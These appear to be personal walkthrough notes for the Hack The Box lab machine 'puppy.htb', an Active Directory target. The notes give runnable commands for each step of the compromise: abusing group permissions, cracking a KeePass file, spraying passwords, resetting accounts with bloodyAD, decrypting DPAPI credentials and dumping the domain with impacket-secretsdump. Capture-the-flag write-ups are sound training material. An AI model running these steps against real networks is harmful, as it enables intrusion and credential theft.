we start with creds levi.james / KingofAkron2025!
nmap shows regular AD ports, and a bunch of rpc ports
smb locked down for anon, guest, null.
smb for levi wasnt anything interesting. however, there was a share "DEV", and in the description, it said the share was for the developers.
`rpcclient -U levi.james puppy.htb`
gave us users list, and enumerated members of the group developers
kerbrute to validate usernames. asrep, kerbroast locked down
no sql, rdp, winrm accesses to levi.

We get some bloodhound data
`faketime "$(sudo ntpdate -q 10.129.232.75 | awk '{print $1 " " $2}')" bloodhound-ce-python -u 'levi.james' -p 'KingofAkron2025!' -ns 10.129.232.75 -d puppy.htb -c All --zip`
OR `rusthound-ce -d puppy.htb -u levi.james@puppy.htb -z`
`BLOODHOUND_PORT=8088 docker compose up -d`

Outbound controls for levi shows, as a member of HR group, we have GenericWrite over Developers group. Which means we can add ourselves to that group.
`net rpc group addmem Developers levi.james -U puppy.htb/levi.james%KingofAkron2025! -S 10.129.232.75`
To verify,
`net rpc group members Developers -U puppy.htb/levi.james%KingofAkron2025! -S 10.129.232.75`

Now, as a member of Developers group, we re-enum smb shares, spider it, expecting to see a bunch of stuff.
`nxc smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!' -M spider_plus -o EXCLUDE_FILTER='print$,NETLOGON,SYSVOL,ipc$'`
jq to filter the spider json
`cat spider_levi.json | jq '. | map_values(keys)' | grep -v 'lnk\|ini'`
shows the only viable thing to be recovery.kdbx file. so we get it

`keepassxc recovery.kdbx`
kpcli doesnt work, because the kbdx file version higher, and hence needs the above one
`keepass2john recovery.kdbx` complains that "File version 40000 is not yet supported"
Upon looking this error up, we find we need to update john. For some reason, it was a 3gb update! `sudo apt update && sudo apt upgrade john`

After a lot of struggles, we finally got a version that works
had to install snapd then insall the below things, and add /snap/bin to the PATH
`sudo snap install core snapd` `sudo snap install john-the-ripper`
`john-the-ripper.keepass2john recovery.kdbx`
then copy the rockyou wordlist to pwd cuz it cant see /usr/share/wordlists for some reason
`john-the-ripper hash.txt --wordlist=rockyou.txt`
and we get the master password "liverpool"

we grab everyone's usernames, passwords, throw them into users.txt passs.txt
`nxc smb 10.129.232.75 -u users.txt -p passs.txt --continue-on-success`

ant.edwards:Antman2025! -->new creds

Ant.edwards has GenericAll over Adam.silver
So, usually, we would do shadow attack, but there's no CA installed on the dc.
We're left with either ForeChangePassword or targeted kerberoast (not working, cuz user is disabled in this case)
`bloodyAD --host 10.129.232.75 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password 'adam.silver' 'PasswordNew'`

we verify this using nxc smb, and see the account is disabled. So we enable it using bloodyAD again!
`bloodyAD --host 10.129.232.75 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE`

we login as adam silver, find a backup tar file, send it over to kali, uncompress it, and we find the creds steph.cooper : ChefSteph2025!

we login as steph.coper, run winPEAS

look for DPAPI, and we find a master key, and 2 credentialfiles
The whole reason we go for this, is because steph.cooper has another admin account, called steph.cooper_adm.
Our hope is to get her steph.cooper_adm  creds from decrypting it
```text
MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
```
evil-winrm cant directly download hidden files
so, copy the masterKey to somewhere in your location
`attrib -s -h masterKey` --unhide the attrib
`download masterKey`

To begin, we decrypt the master key using the impacket-dpapi
`impacket-dpapi masterkey -file masterKey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password ChefSteph2025!`
SID - is in the master-key original file name
```text
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Now, to unlock the credFiles
`impacket-dpapi credential -f credFile1 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84`
--> gives a bunch of trash
Target      : WindowsLive:target=virtualapp/didlogical
Description : PersistedCredential
Username    : 02vpdyzbbgyaqelf

`impacket-dpapi credential -f credFile2 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84`
credFile2 gives us the password for step_adm account!
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!

`impacket-psexec steph.cooper_adm@puppy.htb`
OR, we can secretsdump for the whole domain, just because we can!
`impacket-secretsdump 'steph.cooper_adm:FivethChipOnItsWay2025!@puppy.htb'`

`faketime "$(sudo ntpdate -q 10.129.230.91 | awk '{print $1 " " $2}')"`
fake time not required unless there's a kerberoast

-just-dc-ntlm -use-vss, -just-dc -use-vss dont need kerb
-just-dc-ntlm wayyy faster
-just-dc was wayyy faster.
-just-dc-ntlm -just-dc-user Administrator --> just admin
`impacket-secretsdump puppy.htb/steph.cooper_adm@10.129.230.91 -just-dc-ntlm -use-vss -debug`
CONCLUSION of the test -
setup the stupid mtu for tun0 to 1200
`sudo ip link set mtu 1200 tun0`